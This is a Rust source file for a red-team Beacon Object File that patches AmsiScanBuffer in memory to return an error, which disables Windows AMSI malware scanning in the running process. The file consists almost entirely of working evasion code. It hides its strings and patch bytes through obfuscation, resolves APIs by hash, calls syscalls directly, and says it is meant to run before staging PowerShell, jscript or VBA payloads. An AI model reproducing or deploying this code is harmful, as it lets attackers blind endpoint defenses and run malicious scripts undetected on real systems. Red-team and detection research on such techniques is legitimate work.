// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
// Credit: Rust port + OPSEC hardening — by Dani
//
//! Patch `amsi.dll!AmsiScanBuffer` to return `E_INVALIDARG` (0x80070057),
//! short-circuiting AMSI for the current process. Useful before staging
//! script content that would otherwise be scanned (PowerShell, jscript,
//! VBA in-process via Excel.Application, etc.).
//!
//! Args: none.
//!
//! Implementation:
//!   1. DFR `LoadLibraryA(obf "amsi.dll")` to ensure amsi.dll is mapped.
//!   2. PEB-walk → find amsi.dll → resolve `AmsiScanBuffer` export.
//!   3. NtProtectVirtualMemory → RW
//!   4. Write 6 bytes: `B8 57 00 07 80 C3` (mov eax, 0x80070057; ret),
//!      built at runtime via `obf_bytes!` so the literal isn't in `.rdata`.
//!   5. Restore protection + flush icache.

#![no_std]
#![cfg_attr(not(test), no_main)]

use rustbof::{println, eprintln};
use common::{mitre::Technique, dfr_fn, obf, obf_cstr};

const TECHNIQUES: &[Technique] = &[
    Technique { id: "T1562.001", name: "Impair Defenses: Disable or Modify Tools", tactic: "Defense Evasion" },
];

const PAGE_READWRITE:        u32 = 0x04;
const PAGE_EXECUTE_READ:     u32 = 0x20;
const STATUS_SUCCESS: i32 = 0;

dfr_fn!(
    load_library_a(name: *const i8) -> usize,
    module = "kernel32.dll",
    api    = "LoadLibraryA"
);

#[rustbof::main]
fn main() {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);    match run() {
        Ok(()) => {},
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run() -> Result<(), &'static str> {
    // Ensure amsi.dll is loaded. Module name string is obfuscated.
    obf_cstr! { let amsi_name = c"amsi.dll"; }
    let h = unsafe { load_library_a(amsi_name.as_ptr() as *const i8) }
        .map_err(|_| "LoadLibraryA resolve")?;
    if h == 0 { return Err("LoadLibraryA(amsi.dll) failed"); }

    // Resolve AmsiScanBuffer
    const AMSI_HASH: u32 = common::hash::djb2_case_insensitive(b"amsi.dll");
    const TARGET_HASH: u32 = common::hash::djb2(b"AmsiScanBuffer");
    let amsi = unsafe { common::syscalls::find_module_pub(AMSI_HASH) }
        .ok_or("amsi.dll not in PEB after LoadLibrary")?;
    let target = unsafe { common::syscalls::find_export_pub(amsi, TARGET_HASH) }
        .ok_or("AmsiScanBuffer export not found")?;

    // Build the 6-byte patch at runtime: mov eax, 0x80070057; ret
    let mut patch = [0u8; 6];
    common::obf_bytes! { let stub = b"\xB8\x57\x00\x07\x80\xC3"; }
    patch.copy_from_slice(stub);

    // RW the page
    use common::syscalls::{SyscallEntry, resolve, do_syscall4, do_syscall5};
    static PROTECT: SyscallEntry = SyscallEntry::new();
    const PROTECT_HASH: u32 = common::hash::djb2(b"NtProtectVirtualMemory");
    let (p_ssn, p_addr) = unsafe { resolve(&PROTECT, PROTECT_HASH) }
        .map_err(|_| "resolve NtProtectVirtualMemory")?;

    let cur_proc: usize = (-1isize) as usize;
    let mut base = target;
    let mut size: usize = 6;
    let mut old_prot: u32 = 0;

    let st = unsafe {
        do_syscall5(
            cur_proc,
            &mut base as *mut *mut core::ffi::c_void as usize,
            &mut size as *mut usize as usize,
            PAGE_READWRITE as usize,
            &mut old_prot as *mut u32 as usize,
            p_ssn, p_addr,
        )
    };
    if st != STATUS_SUCCESS {
        return Err("NtProtectVirtualMemory(RW) failed");
    }

    // Write the patch (volatile, no compiler reorder)
    unsafe {
        let dst = target as *mut u8;
        for i in 0..6 {
            core::ptr::write_volatile(dst.add(i), patch[i]);
        }
    }

    // Restore protection
    let mut base2 = target;
    let mut size2: usize = 6;
    let mut prev_prot: u32 = 0;
    let restore_to = if old_prot == 0 { PAGE_EXECUTE_READ } else { old_prot };
    let _ = unsafe {
        do_syscall5(
            cur_proc,
            &mut base2 as *mut *mut core::ffi::c_void as usize,
            &mut size2 as *mut usize as usize,
            restore_to as usize,
            &mut prev_prot as *mut u32 as usize,
            p_ssn, p_addr,
        )
    };

    // Flush icache
    static FLUSH: SyscallEntry = SyscallEntry::new();
    const FLUSH_HASH: u32 = common::hash::djb2(b"NtFlushInstructionCache");
    if let Ok((f_ssn, f_addr)) = unsafe { resolve(&FLUSH, FLUSH_HASH) } {
        let _ = unsafe { do_syscall4(cur_proc, target as usize, 6, 0, f_ssn, f_addr) };
    }

    common::evasion::secure_zero(&mut patch);
    obf! { let ok = "AMSI patched"; }
    println!("[+] {}", ok);
    Ok(())
}
